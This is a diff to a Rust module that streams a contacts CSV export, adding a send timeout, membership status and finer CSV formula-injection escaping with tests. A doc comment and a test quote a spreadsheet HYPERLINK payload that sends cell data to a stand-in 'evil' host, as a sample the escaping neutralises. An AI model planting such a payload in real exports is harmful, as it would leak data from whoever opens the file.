@@ -12,7 +12,7 @@
 //! ends, and a handler future is dropped when the client disconnects. Someone who reads half the
 //! book and hangs up has still read half the book.
 
-use std::borrow::Cow;
+use std::{borrow::Cow, time::Duration};
 
 use axum::body::Body;
 use chrono::{DateTime, SecondsFormat, Utc};
@@ -40,6 +40,12 @@ const CHUNK_BYTES: usize = 32 * 1024;
 /// an export holds, however many contacts it covers.
 const CHUNKS_IN_FLIGHT: usize = 2;
 
+/// How long the producer waits for the client to take a chunk before it gives the export up. `send`
+/// has no timeout of its own, so without this a client that stops reading holds a pooled connection
+/// and a Postgres backend until TCP gives up, and a request-count limit does nothing about a
+/// request that never ends. A browser draining a download takes a chunk in milliseconds.
+pub const SEND_TIMEOUT: Duration = Duration::from_secs(30);
+
 type Chunk = Result<Vec<u8>, std::io::Error>;
 
 /// What the audit row needs that the stream does not know. `filter` is the document **already
@@ -56,13 +62,19 @@ pub struct Audit {
 /// and LibreOffice, and a `first_name` of `=HYPERLINK("http://evil/?x="&A1,"click")` is settable
 /// through any signup form. It would execute in the browser of whoever opens the export of the
 /// whole book, who is the person with the most access. A leading `'` makes every one of them read
-/// the cell as text. It is applied to **every** cell, a number included: a negative number comes
-/// out as `'-5`, which is the price of there being no cell that is trusted.
+/// the cell as text.
+///
+/// **A cell that is a finite number is left alone**, so a number field of `-5` round-trips as `-5`
+/// and not as the text `'-5`. The test is on the whole cell with no `trim`: `-5-5`, `-inf`, `-nan`
+/// and `\t5` are not numbers and stay prefixed. An email that begins `+` or `-` also stays
+/// prefixed (plus-addressing makes `+x@y.com` real); the importer strips a leading apostrophe on
+/// read, which is lossless, where an exception per column would mean reasoning about a
+/// spreadsheet's parser per column.
 fn push_cell(out: &mut String, cell: &str) {
     let formula = matches!(
         cell.chars().next(),
         Some('=' | '+' | '-' | '@' | '\t' | '\r')
-    );
+    ) && !cell.parse::<f64>().is_ok_and(f64::is_finite);
     let cell: Cow<str> = if formula {
         Cow::Owned(format!("'{cell}"))
     } else {
@@ -104,9 +116,10 @@ fn attr_text(value: Option<&Value>) -> String {
 /// The export query. **The workspace clause is written here**: neither `push_filter` nor
 /// `push_rules` emits one, and a missing one exports every tenant's contacts.
 ///
-/// `lists` and `tags` are every membership and tag, whatever the membership's status, as the
-/// grid's `list_id` filter reads it. `contacts` is not aliased: the fragments the filter appends
-/// refer to it by name.
+/// `lists` is `name:status` for every membership, whatever its status: an export that cannot tell
+/// `unsubscribed` from `subscribed` is a re-subscription waiting for the importer. `tags` are bare
+/// names, having no status. `contacts` is not aliased: the fragments the filter appends refer to
+/// it by name.
 fn query(
     workspace_id: Uuid,
     filter: &ContactFilter,
@@ -115,7 +128,7 @@ fn query(
     let mut q = QueryBuilder::<Postgres>::new(
         "select contacts.id, contacts.email, contacts.first_name, contacts.last_name, \
          contacts.timezone, contacts.created_at, contacts.updated_at, contacts.attributes, \
-         coalesce((select string_agg(l.name, ';' order by l.name) \
+         coalesce((select string_agg(l.name || ':' || m.status, ';' order by l.name) \
             from list_memberships m join lists l \
               on l.workspace_id = m.workspace_id and l.id = m.list_id \
             where m.workspace_id = contacts.workspace_id and m.contact_id = contacts.id), '') \
@@ -143,35 +156,38 @@ fn query(
     q
 }
 
-/// Starts the export and returns its body. `live` is the workspace's non-archived custom fields,
-/// each a column named `attr:<key>` (the rule field's own spelling, so no key can collide with a
-/// built-in column).
+/// What to export. `live` is the workspace's non-archived custom fields, each a column named
+/// `attr:<key>` (the rule field's own spelling, so no key can collide with a built-in column).
+pub struct Export {
+    pub workspace_id: Uuid,
+    pub filter: ContactFilter,
+    pub rules: Option<Group>,
+    pub live: Vec<Definition>,
+}
+
+/// Starts the export and returns its body.
 pub fn start(
     pool: PgPool,
     mut conn: PoolConnection<Postgres>,
-    workspace_id: Uuid,
-    filter: ContactFilter,
-    rules: Option<Group>,
-    live: Vec<Definition>,
+    job: Export,
     audit: Audit,
+    send_timeout: Duration,
 ) -> Body {
     let (tx, mut rx) = mpsc::channel::<Chunk>(CHUNKS_IN_FLIGHT);
     tokio::spawn(async move {
-        let job = Job {
-            workspace_id,
-            filter: &filter,
-            rules: rules.as_ref(),
-            live: &live,
-        };
-        let (rows, complete) = produce(&mut conn, &job, &tx).await;
-        // Recorded whichever way it ended: complete, a database error, or a client that left. On
-        // the pool, not `conn`: a client that left mid-result leaves rows unread on `conn`, and
-        // the next statement on it would first read the rest of them.
+        let (rows, complete) = produce(&mut conn, &job, &tx, send_timeout).await;
+        // Before the audit write, which needs a connection of its own: holding this one while
+        // asking for another is a cascade on a busy pool, where every finishing export waits on a
+        // connection only another finishing export can free, and a completed export goes
+        // unrecorded after the acquire timeout. Nor is the audit written on `conn`: a client that
+        // left mid-result leaves rows unread on it, and the next statement would first read them.
+        drop(conn);
+        // Recorded whichever way it ended: complete, a database error, or a client that left.
         let recorded = audit::record(
             &pool,
             &audit.meta,
             AuditEvent {
-                workspace_id: Some(workspace_id),
+                workspace_id: Some(job.workspace_id),
                 actor: audit.actor,
                 action: actions::CONTACTS_EXPORTED,
                 target_type: None,
@@ -187,18 +203,21 @@ pub fn start(
     Body::from_stream(stream::poll_fn(move |cx| rx.poll_recv(cx)))
 }
 
-struct Job<'a> {
-    workspace_id: Uuid,
-    filter: &'a ContactFilter,
-    rules: Option<&'a Group>,
-    live: &'a [Definition],
+/// Hands a chunk to the client; `false` when the client has gone or has not taken the previous
+/// chunk within `timeout`, either of which ends the export.
+async fn send(tx: &mpsc::Sender<Chunk>, chunk: Chunk, timeout: Duration) -> bool {
+    matches!(
+        tokio::time::timeout(timeout, tx.send(chunk)).await,
+        Ok(Ok(()))
+    )
 }
 
 /// Writes the CSV into `tx`; returns how many contacts were sent and whether the stream finished.
 async fn produce(
     conn: &mut PoolConnection<Postgres>,
-    job: &Job<'_>,
+    job: &Export,
     tx: &mpsc::Sender<Chunk>,
+    send_timeout: Duration,
 ) -> (u64, bool) {
     let mut head = String::new();
     let mut names: Vec<String> = ["id", "email", "first_name", "last_name", "timezone"]
@@ -210,10 +229,10 @@ async fn produce(
     names.extend(["lists", "tags", "suppressed"].map(str::to_owned));
     push_row(&mut head, names.iter().map(String::as_str));
     // The header goes out on its own, before the first row is read.
-    if tx.send(Ok(head.into_bytes())).await.is_err() {
+    if !send(tx, Ok(head.into_bytes()), send_timeout).await {
         return (0, false);
     }
-    let mut q = query(job.workspace_id, job.filter, job.rules);
+    let mut q = query(job.workspace_id, &job.filter, job.rules.as_ref());
     let mut rows = q.build().fetch(&mut **conn);
     let mut chunk = String::new();
     let (mut sent, mut in_chunk) = (0u64, 0u64);
@@ -224,7 +243,12 @@ async fn produce(
                 tracing::error!(error = ?e, "export query failed mid-stream");
                 // Aborts the response rather than ending it, so a truncated file is an error to
                 // the client and not a short file that looks whole.
-                let _ = tx.send(Err(std::io::Error::other("export failed"))).await;
+                send(
+                    tx,
+                    Err(std::io::Error::other("export failed")),
+                    send_timeout,
+                )
+                .await;
                 return (sent, false);
             }
         };
@@ -248,13 +272,13 @@ async fn produce(
         in_chunk += 1;
         if chunk.len() >= CHUNK_BYTES {
             let full = std::mem::take(&mut chunk).into_bytes();
-            if tx.send(Ok(full)).await.is_err() {
+            if !send(tx, Ok(full), send_timeout).await {
                 return (sent, false);
             }
             sent += std::mem::take(&mut in_chunk);
         }
     }
-    if !chunk.is_empty() && tx.send(Ok(chunk.into_bytes())).await.is_err() {
+    if !chunk.is_empty() && !send(tx, Ok(chunk.into_bytes()), send_timeout).await {
         return (sent, false);
     }
     (sent + in_chunk, true)
@@ -285,6 +309,31 @@ mod tests {
             cell(r#"=HYPERLINK("http://evil/?x="&A1,"click")"#),
             r#""'=HYPERLINK(""http://evil/?x=""&A1,""click"")""#
         );
+    }
+
+    #[test]
+    fn a_line_break_forces_quoting() {
+        assert_eq!(cell("a\nb"), "\"a\nb\"");
+        assert_eq!(cell("a\rb"), "\"a\rb\"");
+        assert_eq!(cell("a\r\nb"), "\"a\r\nb\"");
+        // A leading CR is both: neutralised, then quoted because it holds a CR.
+        assert_eq!(cell("\r=1"), "\"'\r=1\"");
+    }
+
+    #[test]
+    fn a_finite_number_is_left_alone_and_nothing_that_merely_looks_like_one() {
+        for n in ["-5", "+5", "-5.5", "-1e3", "-0"] {
+            assert_eq!(cell(n), n);
+        }
+        for t in [
+            "-5-5", "-inf", "-nan", "+inf", "\t5", "-5e999", "=5", "@5", "- 5",
+        ] {
+            assert!(
+                cell(t).trim_start_matches('"').starts_with('\''),
+                "{t} -> {}",
+                cell(t)
+            );
+        }
     }
 
     #[test]
